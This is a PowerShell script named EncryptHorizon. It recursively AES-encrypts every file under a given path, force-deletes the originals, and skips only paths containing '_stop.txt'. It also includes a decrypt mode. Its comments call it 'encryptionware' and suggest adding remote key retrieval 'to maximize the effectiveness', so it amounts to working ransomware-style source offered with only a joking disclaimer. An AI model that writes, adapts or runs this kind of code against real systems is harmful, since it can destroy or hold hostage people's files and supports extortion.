# EncryptHorizon
# Author: @maxbirnbacher
# Date: 2023-10-07
# Version: 1.0

# This script is modifying the Invoke-AESEncryption function from DRTools
# It is intended to encrypt any file or folder that is specified in the input
# If the script finds a file that is matching a specific name, it will not be encrypted
# Everything else will be encrypted. Muhahahaha!!!! (do not use this script for evil purposes (there are probably bether tools out there) ;-) )

# Usage:
# Load the script in PowerShell and use the EncryptHorizon function
# . .\encrypter.ps1

# Now you can use the EncryptHorizon function
# EncryptHorizon -action <Encrypt|Decrypt> [-path <path>]


# Install the DRTools module from the PowerShell Gallery if not already installed
if (-not (Get-Module -ListAvailable -Name DRTools)) {
    Install-Module -Name DRTools -Scope CurrentUser -Force
}

# Import the DRTools module
Import-Module DRTools

# Define the key. This is the base64 encoded version of "12345678901234567890123456789012" (Change this to your key or even implement a remote key retrieval, to maximize the effectiveness of you encryptionware)
$key = "MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI="

# Define the special file (red flag)
$redFlagFile = "_stop.txt"

# Function to encrypt or decrypt a single file
function EncryptOrDecryptFile($filePath, $action) {
    # Check if the file exists
    if (Test-Path $filePath -PathType Leaf) {
        if ($action -eq "Encrypt") {
            #check if the file is the red flag file (or if the path contains the red flag at any point) and skip it
            if ($filePath -like "*$redFlagFile*") {
                Write-Host "Skipping $redFlagFile"
                return
            } else {
                Write-Host "Encrypting $filePath"
                # Perform encryption and delete the original file
                Invoke-AESEncryption -Path $filePath -Mode Encrypt -Key $key
                Remove-Item $filePath -Force
            }
        } elseif ($action -eq "Decrypt") {
            if ($filePath -like "*.aes") {
                Write-Host "Decrypting $filePath"
                # Perform decryption and delete the encrypted file
                Invoke-AESEncryption -Path $filePath -Mode Decrypt -Key $key
                Remove-Item $filePath -Force
            }
        }
    }
}

# Function to recursively encrypt or decrypt files in a folder
function EncryptOrDecryptFolder($folderPath, $action) {
    # Check if the folder exists
    if (Test-Path $folderPath -PathType Container) {
        # Get all files in the folder
        $files = Get-ChildItem $folderPath -File

        # Process each file
        foreach ($file in $files) {
            # Encrypt or decrypt the file
            EncryptOrDecryptFile $file.FullName $action
        }

        # Recursively process subfolders
        $subfolders = Get-ChildItem $folderPath -Directory
        foreach ($subfolder in $subfolders) {
            EncryptOrDecryptFolder $subfolder.FullName $action
        }
    }
}

# Function to use the script as a command
function EncryptHorizon {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateSet("Encrypt", "Decrypt")]
        [string]$action,

        [Parameter(Mandatory = $true)]
        [string]$path
    )

    # Check if the path is a file or folder
    if (Test-Path $path -PathType Leaf) {
        # Encrypt or decrypt the file
        EncryptOrDecryptFile $path $action
    } elseif (Test-Path $path -PathType Container) {
        # Encrypt or decrypt the folder
        EncryptOrDecryptFolder $path $action
    } else {
        Write-Host "The specified path does not exist"
    }
}

# Example usage:
# Encrypt files in a folder (change the path to your folder)
#EncryptOrDecryptFolder "C:\Path\To\Folder" "Encrypt"

# Decrypt files in a folder (change the path to your folder)
#EncryptOrDecryptFolder "C:\Path\To\Folder" "Decrypt"
